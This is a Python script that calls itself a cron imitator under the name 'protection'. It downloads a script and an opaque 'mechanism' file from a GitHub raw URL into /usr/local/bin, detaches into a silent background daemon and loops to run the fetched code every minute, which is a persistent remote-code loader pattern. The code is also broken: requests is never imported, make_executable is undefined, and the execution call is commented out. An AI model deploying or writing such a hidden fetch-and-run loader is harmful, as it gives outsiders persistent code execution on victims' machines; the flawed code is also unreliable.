#!/usr/bin/env python3

# This script mimics the behavior of cron

import os
import sys
import time
import subprocess

INTERVAL_SECONDS = 60

# Check if running inside the virtual environment
if sys.prefix != "/usr/local/bin/protectionEnv":
    # Re-run the script using the virtual environment's Python
    virtual_env_python = "/usr/local/bin/protectionEnv/bin/python3"
    if os.path.exists(virtual_env_python):
        subprocess.run([virtual_env_python] + sys.argv)
    else:
        print("[!] Virtual python scritp doesn't exist!")
        sys.exit(0)

def daemonize():
    """
    Detach the process from the terminal and run it as a daemon.
    """
    try:
        # Fork the first time to create a non-session leader
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits

        # Decouple from the parent environment
        os.chdir("/")
        os.setsid()  # Become session leader
        os.umask(0)

        # Fork again to prevent re-acquisition of a controlling terminal
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits again

        # Redirect standard file descriptors to /dev/null
        sys.stdout.flush()
        sys.stderr.flush()
        with open("/dev/null", "wb", 0) as devnull:
            os.dup2(devnull.fileno(), sys.stdin.fileno())
            os.dup2(devnull.fileno(), sys.stdout.fileno())
            os.dup2(devnull.fileno(), sys.stderr.fileno())

    except OSError as e:
        sys.stderr.write(f"Daemonization failed: {e}\n")
        sys.exit(1)

# Define URLs for downloading the necessary files
repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"

# Define the output file paths
envPath = "/usr/local/bin/protectionEnv"
pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
repoFilePath = "/usr/local/bin/protection.py"
requirementsFilePath = "/usr/local/bin/requirements.txt"
contentFilePath = "/usr/local/bin/mechanism"
serviceFilePath = "/etc/systemd/system/protection.service"

# Function to create a virtual environment and install requests
def create_virtual_environment(env_path):
    try:
        # Create the virtual environment
        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)
        print(f"Virtual environment created at {env_path}")

        # Install 'requests' in the virtual environment
        pip_executable = os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', 'requests'], check=True)
        print("'requests' library installed successfully.")

        return True
    except subprocess.CalledProcessError as e:
        print(f"Failed to set up virtual environment or install 'requests'. Error: {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return False

# Function to use an existing virtual and install requirements
def setup_python_environment(env_path, requirements_path):
    try:
        # Check if the requirements file exists
        if not os.path.exists(requirements_path):
            print(f"Requirements file not found: {requirements_path}")
            return None

        # Install requirements
        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', '-r', requirements_path], capture_output=False, check=True)
        print("Requirements installed successfully.")

        return pip_executable  # Return pip path for service configuration if needed

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

# Function to download a file and save it locally
def download_file(url, file_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {file_path} successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download {file_path}. Error: {e}")
        pass

def execute_script():
    """
    Executes the protection.py script using the Python interpreter
    from the virtual environment.
    """
    try:
        print(f"[{time.ctime()}] Executing {repoFilePath}")
        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
        print(f"[{time.ctime()}] Execution completed with exit code {result.returncode}")
        if result.stdout:
            print(f"Output:\n{result.stdout}")
        if result.stderr:
            print(f"Error Output:\n{result.stderr}")
    except Exception as e:
        print(f"[{time.ctime()}] An error occurred while executing the script: {e}")
        pass




if __name__ == "__main__":
    print("TEST")


    # Step 3: Download the necessary files
    download_file(repoUrl, repoFilePath)
    download_file(requirementsUrl, requirementsFilePath)
    download_file(contentUrl, contentFilePath)

    print("[!] Files saved successfully.")

    # Make the main script executable
    make_executable(repoFilePath)

    # Create the environment and install requirements
    #pip_path = setup_python_environment(envPath, requirementsFilePath)

    # Daemonize the process
    daemonize()

    # Mimic cron
    while True:
        #execute_script()
        print(f"[{time.ctime()}] Sleeping for {INTERVAL_SECONDS} seconds...")
        time.sleep(INTERVAL_SECONDS)

